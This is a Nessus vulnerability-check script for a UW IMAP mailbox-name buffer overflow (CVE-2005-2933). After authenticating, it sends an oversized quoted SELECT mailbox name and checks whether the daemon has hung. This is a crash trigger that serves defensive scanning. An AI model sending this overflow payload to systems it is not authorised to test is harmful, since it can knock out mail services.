#
# (C) Tenable Network Security
#


if (description) {
  script_id(19938);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2933");
  script_bugtraq_id(15009);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"19856");
  }

  name["english"] = "UW IMAP Mailbox Name Buffer Overflow";
  script_name(english:name["english"]);

  desc["english"] = "
Synopsis :

The remote IMAP server is prone to a buffer overflow. 

Description :

The remote host appears to be running a version of the University of
Washington's IMAP daemon that is prone to a buffer overflow
vulnerability involving long mailbox names that begin with a
double-quote character.  An authenticated attacker may be able to
exploit this to execute arbitrary code subject to the privileges of
the user. 

See also :

http://www.idefense.com/application/poi/display?id=313&type=vulnerabilities

Solution : 

Upgrade to UW IMAP imap-2004g or later.

Risk factor : 

Medium / CVSS Base Score : 4 
(AV:R/AC:L/Au:R/C:P/A:P/I:P/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for mailbox name buffer overflow in in UW IMAP";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"Gain a shell remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("imap_overflow.nasl");
  script_require_keys("imap/login", "imap/password");
  script_exclude_keys("imap/false_imap", "imap/overflow");
  script_require_ports("Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) debug_print("imap/login and/or imap/password are empty; skipped!", level:0);
  exit(0);
}


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}

# Try to log in.
#
# - try the PLAIN SASL mechanism.
#   nb: RFC 3501 requires this be supported by imap4rev1 servers, although
#       it may also require SSL / TLS encapsulation.
++tag;
resp = NULL;
c = string("nessus", string(tag), ' AUTHENTICATE "PLAIN"');
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
s = chomp(s);
if (s =~ "^\+") {
  c = base64(str:raw_string(0, user, 0, pass));
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }
}

# If that didn't work, try LOGIN command.
if (isnull(resp)) {
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }
}


# If successful, try to exploit the flaw.
if (resp && resp =~ "OK") {
  ++tag;
  resp = NULL;
  c = string("nessus", string(tag), ' SELECT "{localhost/user=\\"', crap(data:"A", length:500) ,'}"');
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
  }

  # If we didn't get a response, try to send a NOOP just to make sure it's down.
  if (isnull(resp)) {
    # Check if the daemon is hung.
    ++tag;
    resp = NULL;
    c = string("nessus", string(tag), " NOOP");
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
    }
    if (isnull(resp)) {
      security_warning(port);
      exit(0);
    }
  }
}
else if (resp =~ "NO") {
  if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
}


# Logout.
++tag;
resp = NULL;
c = string("nessus", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
}
close(soc);
